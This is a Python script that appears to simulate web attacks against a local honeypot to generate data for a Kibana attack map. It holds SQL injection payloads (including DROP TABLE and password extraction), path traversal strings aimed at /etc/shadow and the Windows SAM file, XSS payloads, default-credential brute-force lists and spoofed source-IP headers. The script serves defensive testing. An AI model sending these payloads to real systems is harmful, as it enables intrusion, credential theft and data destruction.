#!/usr/bin/env python3
"""
⚠️⚠️⚠️ SECURITY WARNING ⚠️⚠️⚠️

DO NOT run this script against systems you do not own or have explicit
written permission to test. Unauthorized access attempts are illegal.

This simulator is for TESTING ONLY on localhost or systems you control.

Features:
- Simulates attacks from multiple geographic locations
- Uses diverse public IPs (spoofed via headers)
- Creates realistic attack patterns for visualization
- Generates data for Kibana map testing
"""

import argparse
import sys
import time
import random
from typing import List, Dict
import requests
from datetime import datetime

DEFAULT_TARGET = '127.0.0.1'
DEFAULT_HONEYPOT_PORT = 8080
DEFAULT_COUNT = 50  # More attacks for better visualization
DEFAULT_DELAY = 0.5

# Real public IPs from different countries for testing
# These will be sent as X-Forwarded-For headers
ATTACKER_IPS = [
    # United States
    {"ip": "34.95.113.255", "country": "US", "city": "Mountain View"},
    {"ip": "13.107.246.42", "country": "US", "city": "Seattle"},
    {"ip": "104.17.253.239", "country": "US", "city": "San Francisco"},
    
    # China
    {"ip": "118.123.243.98", "country": "CN", "city": "Beijing"},
    {"ip": "61.135.169.125", "country": "CN", "city": "Shanghai"},
    
    # Russia
    {"ip": "5.255.253.50", "country": "RU", "city": "Moscow"},
    {"ip": "77.88.55.242", "country": "RU", "city": "St Petersburg"},
    
    # Germany
    {"ip": "88.198.48.10", "country": "DE", "city": "Frankfurt"},
    {"ip": "185.199.108.153", "country": "DE", "city": "Berlin"},
    
    # United Kingdom
    {"ip": "185.117.153.79", "country": "GB", "city": "London"},
    {"ip": "51.140.148.226", "country": "GB", "city": "Manchester"},
    
    # India
    {"ip": "103.21.244.8", "country": "IN", "city": "Mumbai"},
    {"ip": "117.18.232.200", "country": "IN", "city": "Bangalore"},
    
    # Brazil
    {"ip": "177.71.207.165", "country": "BR", "city": "São Paulo"},
    {"ip": "200.160.2.3", "country": "BR", "city": "Rio de Janeiro"},
    
    # Japan
    {"ip": "203.104.209.71", "country": "JP", "city": "Tokyo"},
    {"ip": "202.32.115.85", "country": "JP", "city": "Osaka"},
    
    # South Korea
    {"ip": "211.249.220.24", "country": "KR", "city": "Seoul"},
    
    # France
    {"ip": "51.158.22.211", "country": "FR", "city": "Paris"},
    
    # Netherlands
    {"ip": "185.107.56.23", "country": "NL", "city": "Amsterdam"},
    
    # Australia
    {"ip": "103.28.54.161", "country": "AU", "city": "Sydney"},
    
    # Canada
    {"ip": "192.168.1.6", "country": "CA", "city": "Toronto"},  # Private for testing
]

SQL_INJECTION_PAYLOADS = [
    "admin' OR '1'='1",
    "admin' OR 1=1--",
    "' UNION SELECT NULL, username, password FROM users--",
    "admin'; DROP TABLE users--",
    "1' AND '1'='1",
    "' OR 'a'='a",
    "1' UNION SELECT NULL--",
    "admin'--",
    "' OR 1=1 LIMIT 1--",
    "1' AND SLEEP(5)--",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "../../../../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....\\....\\....\\windows\\win.ini",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
]

SUSPICIOUS_USER_AGENTS = [
    "sqlmap/1.0",
    "Nikto/2.1.6",
    "Nmap NSE",
    "masscan/1.0",
    "ZmEu",
    "Havij",
    "Acunetix",
    "Burp Suite",
]

ATTACK_PATHS = [
    "/admin",
    "/login",
    "/admin.php",
    "/phpMyAdmin",
    "/wp-admin",
    "/administrator",
    "/.env",
    "/config.php",
    "/backup.sql",
    "/database.sql",
]


class EnhancedAttackSimulator:
    def __init__(self, target: str, port: int, count: int, delay: float, 
                 use_random_ips: bool = True, verbose: bool = True):
        self.target = target
        self.port = port
        self.count = count
        self.delay = delay
        self.use_random_ips = use_random_ips
        self.verbose = verbose
        self.base_url = f"http://{target}:{port}"
        self.attack_count = 0

    def log(self, message: str):
        if self.verbose:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

    def get_random_attacker(self) -> Dict:
        """Get random attacker IP for geographic diversity"""
        return random.choice(ATTACKER_IPS)

    def send_attack(self, method: str = "GET", path: str = "/", 
                   data: dict = None, attack_type: str = "unknown"):
        """Send single attack with spoofed source IP"""
        attacker = self.get_random_attacker() if self.use_random_ips else ATTACKER_IPS[0]
        
        headers = {
            'X-Forwarded-For': attacker['ip'],
            'X-Real-IP': attacker['ip'],
            'User-Agent': random.choice(SUSPICIOUS_USER_AGENTS)
        }
        
        try:
            url = f"{self.base_url}{path}"
            
            if method == "POST":
                response = requests.post(url, data=data, headers=headers, timeout=5)
            else:
                response = requests.get(url, headers=headers, timeout=5)
            
            self.attack_count += 1
            self.log(f"[{attack_type}] {attacker['ip']} ({attacker['country']}) → "
                    f"{path[:40]} | Status: {response.status_code}")
            
            time.sleep(self.delay)
            return response
            
        except Exception as e:
            self.log(f"[ERROR] {attacker['ip']} → {path[:30]} | {str(e)[:50]}")

    def simulate_sql_injection(self):
        """Simulate SQL injection from multiple countries"""
        self.log(f"\n{'='*60}")
        self.log(f"SQL INJECTION ATTACK WAVE ({self.count} attempts)")
        self.log(f"{'='*60}")

        for i in range(self.count):
            payload = random.choice(SQL_INJECTION_PAYLOADS)
            path = random.choice(["/login", "/admin", "/user"])
            
            self.send_attack(
                method="POST",
                path=path,
                data={'username': payload, 'password': 'test123'},
                attack_type="SQLi"
            )

    def simulate_path_traversal(self):
        """Simulate path traversal from multiple locations"""
        self.log(f"\n{'='*60}")
        self.log(f"PATH TRAVERSAL ATTACK WAVE ({self.count} attempts)")
        self.log(f"{'='*60}")

        for i in range(self.count):
            payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
            
            self.send_attack(
                method="GET",
                path=f"/{payload}",
                attack_type="PATH"
            )

    def simulate_xss_attacks(self):
        """Simulate XSS attacks"""
        self.log(f"\n{'='*60}")
        self.log(f"XSS ATTACK WAVE ({self.count} attempts)")
        self.log(f"{'='*60}")

        for i in range(self.count):
            payload = random.choice(XSS_PAYLOADS)
            path = random.choice(["/search", "/comment", "/profile"])
            
            self.send_attack(
                method="GET",
                path=f"{path}?q={payload}",
                attack_type="XSS"
            )

    def simulate_admin_bruteforce(self):
        """Simulate admin panel brute force"""
        self.log(f"\n{'='*60}")
        self.log(f"ADMIN BRUTEFORCE WAVE ({self.count} attempts)")
        self.log(f"{'='*60}")

        usernames = ["admin", "root", "administrator", "user", "test"]
        passwords = ["admin", "password", "123456", "root", "test123"]

        for i in range(self.count):
            user = random.choice(usernames)
            pwd = random.choice(passwords)
            
            self.send_attack(
                method="POST",
                path="/admin/login",
                data={'username': user, 'password': pwd},
                attack_type="BRUTE"
            )

    def simulate_suspicious_scanning(self):
        """Simulate scanning for sensitive paths"""
        self.log(f"\n{'='*60}")
        self.log(f"PATH SCANNING WAVE ({self.count} attempts)")
        self.log(f"{'='*60}")

        for i in range(self.count):
            path = random.choice(ATTACK_PATHS)
            
            self.send_attack(
                method="GET",
                path=path,
                attack_type="SCAN"
            )

    def run_mixed_attacks(self):
        """Run mixed attack patterns for realistic simulation"""
        self.log(f"\n{'='*60}")
        self.log(f"MIXED ATTACK SIMULATION")
        self.log(f"{'='*60}")
        
        attack_methods = [
            self.simulate_sql_injection,
            self.simulate_path_traversal,
            self.simulate_xss_attacks,
            self.simulate_admin_bruteforce,
            self.simulate_suspicious_scanning
        ]
        
        # Run each attack type
        for attack in attack_methods:
            attack()
            time.sleep(1)  # Brief pause between attack types

    def run_all(self):
        """Run comprehensive attack simulation"""
        print("\n" + "="*60)
        print("ENHANCED ATTACK SIMULATOR - STARTING")
        print("="*60)
        print(f"Target: {self.target}:{self.port}")
        print(f"Attacks per type: {self.count}")
        print(f"Delay: {self.delay}s")
        print(f"Geographic diversity: {len(ATTACKER_IPS)} countries")
        print("="*60)

        start_time = time.time()

        try:
            self.run_mixed_attacks()
            
        except KeyboardInterrupt:
            print("\n\n[!] Simulation interrupted by user")
            sys.exit(0)

        elapsed = time.time() - start_time

        print("\n" + "="*60)
        print("SIMULATION COMPLETED")
        print(f"Total attacks sent: {self.attack_count}")
        print(f"Total time: {elapsed:.2f} seconds")
        print(f"Attack rate: {self.attack_count/elapsed:.2f} attacks/sec")
        print("="*60)
        print("\n✅ Check your Kibana dashboard for the attack map!")
        print("   - Geographic distribution across multiple countries")
        print("   - Different attack types and patterns")
        print("   - Timeline visualization should show the attack wave")
        print("="*60 + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="Enhanced attack simulator with multi-IP geographic testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test with 100 attacks from different countries
  python3 enhanced_attacker.py --count 100

  # Fast simulation (0.1s delay)
  python3 enhanced_attacker.py --count 50 --delay 0.1

  # Slower, more realistic
  python3 enhanced_attacker.py --count 30 --delay 2

  # Target specific port
  python3 enhanced_attacker.py --port 5000

NOTE: This uses X-Forwarded-For headers to simulate different source IPs.
Your honeypot must read this header for geographic diversity to work!
"""
    )

    parser.add_argument('--target', type=str, default=DEFAULT_TARGET,
                       help=f'Target IP (default: {DEFAULT_TARGET})')
    parser.add_argument('--port', type=int, default=DEFAULT_HONEYPOT_PORT,
                       help=f'Target port (default: {DEFAULT_HONEYPOT_PORT})')
    parser.add_argument('--count', type=int, default=DEFAULT_COUNT,
                       help=f'Attacks per type (default: {DEFAULT_COUNT})')
    parser.add_argument('--delay', type=float, default=DEFAULT_DELAY,
                       help=f'Delay between attacks (default: {DEFAULT_DELAY}s)')
    parser.add_argument('--quiet', action='store_true',
                       help='Minimize output')
    parser.add_argument('--single-ip', action='store_true',
                       help='Use only one IP instead of rotating (for testing)')

    args = parser.parse_args()

    # Safety check
    if args.target not in ['127.0.0.1', 'localhost', '::1']:
        print("⚠️" * 30)
        print("WARNING: Targeting non-localhost!")
        print(f"Target: {args.target}")
        print("⚠️" * 30)
        response = input("Type 'YES' to continue: ")
        if response != 'YES':
            sys.exit(0)

    simulator = EnhancedAttackSimulator(
        target=args.target,
        port=args.port,
        count=args.count,
        delay=args.delay,
        use_random_ips=not args.single_ip,
        verbose=not args.quiet
    )

    simulator.run_all()


if __name__ == '__main__':
    main()
